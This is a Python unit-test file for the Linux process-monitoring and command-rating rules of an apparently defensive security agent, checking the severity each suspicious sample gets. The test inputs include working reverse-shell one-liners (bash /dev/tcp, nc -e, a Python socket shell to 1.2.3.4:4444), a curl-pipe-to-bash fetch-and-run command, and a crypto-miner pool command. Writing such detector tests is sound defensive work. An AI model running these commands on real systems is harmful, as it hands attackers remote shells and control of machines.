"""Règles de surveillance de l'agent Linux (extraites de mini_agent.py)."""
import ast
import os
import re
import unittest

SOURCE = os.path.join(os.path.dirname(__file__), "..", "mini_agent.py")
WANTED = {"_SEVERITY_ORDER", "_TEMP_DIRS", "_SHELLS", "_WEB_SERVERS", "_APP_SERVERS", "_OFFENSIVE_TOOLS",
          "_LINUX_CMD_RULES", "_rate_linux_command", "_linux_process_findings"}


def _load():
    tree = ast.parse(open(SOURCE, encoding="utf-8").read())
    nodes = [n for n in tree.body
             if (isinstance(n, ast.FunctionDef) and n.name in WANTED)
             or (isinstance(n, ast.Assign) and any(getattr(t, "id", None) in WANTED for t in n.targets))]
    ns = {"os": os, "re": re}
    exec(compile(ast.Module(body=nodes, type_ignores=[]), SOURCE, "exec"), ns)
    return ns


L = _load()


def findings(comm, exe, cmd="", parent="", parent_exe="", parent_cmd="", watchlist=()):
    return {(r, s) for r, s, _t, _e in L["_linux_process_findings"](comm, exe, cmd, parent, parent_exe,
                                                                     parent_cmd, list(watchlist))}


class LinuxProcessRulesTests(unittest.TestCase):
    def test_ordinary_processes(self):
        self.assertEqual(findings("sshd", "/usr/sbin/sshd", "sshd: /usr/sbin/sshd -D"), set())
        self.assertEqual(findings("bash", "/usr/bin/bash", "-bash", "sshd", "/usr/sbin/sshd"), set())
        # binaire remplacé par une mise à jour : « (deleted) » hors dossier temporaire n'est pas suspect
        self.assertEqual(findings("nginx", "/usr/sbin/nginx (deleted)", "nginx: worker process"), set())

    def test_reverse_shells(self):
        self.assertIn(("suspicious_command", "critical"), findings("bash", "/usr/bin/bash", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"))
        self.assertIn(("suspicious_command", "critical"), findings("nc", "/usr/bin/nc", "nc -e /bin/sh 1.2.3.4 4444"))
        self.assertIn(("suspicious_command", "critical"), findings(
            "python3", "/usr/bin/python3",
            "python3 -c import socket,subprocess,os;s=socket.socket();s.connect(('1.2.3.4',4444));subprocess.call(['/bin/sh','-i'])"))

    def test_temp_and_memfd_execution(self):
        self.assertIn(("suspicious_location", "high"), findings("x", "/dev/shm/.x/x"))
        self.assertIn(("fileless_process", "critical"), findings("x", "/memfd:x (deleted)"))

    def test_miners_and_tools(self):
        self.assertIn(("offensive_tool", "high"), findings("xmrig", "/opt/x/xmrig"))
        self.assertIn(("suspicious_command", "high"), findings("x", "/opt/x", "x -o stratum+tcp://pool:3333"))

    def test_shell_spawned_by_services(self):
        self.assertIn(("webserver_spawns_shell", "high"), findings("sh", "/usr/bin/dash", "sh -c id", "nginx"))
        self.assertIn(("service_spawns_shell", "medium"), findings("sh", "/usr/bin/dash", "sh -c id", "php-fpm8.2"))
        watch = [{"name": "Confluence", "match": ["confluence"], "cves": ["CVE-2026-2222"]}]
        self.assertIn(("vulnerable_app_spawns_shell", "critical"),
                      findings("bash", "/usr/bin/bash", "bash", "java", "/opt/atlassian/confluence/jre/bin/java",
                               "java -Dconfluence.home=/var/atlassian", watch))


class LinuxCommandRatingTests(unittest.TestCase):
    def test_cron_and_units(self):
        self.assertEqual(L["_rate_linux_command"]("/usr/bin/certbot -q renew")[0], "medium")
        self.assertEqual(L["_rate_linux_command"]("curl -s http://x/a.sh | bash")[0], "high")
        self.assertEqual(L["_rate_linux_command"]("/dev/shm/.k/run")[0], "high")
        self.assertEqual(L["_rate_linux_command"]("bash -i >& /dev/tcp/1.2.3.4/1 0>&1")[0], "critical")


if __name__ == "__main__":
    unittest.main()
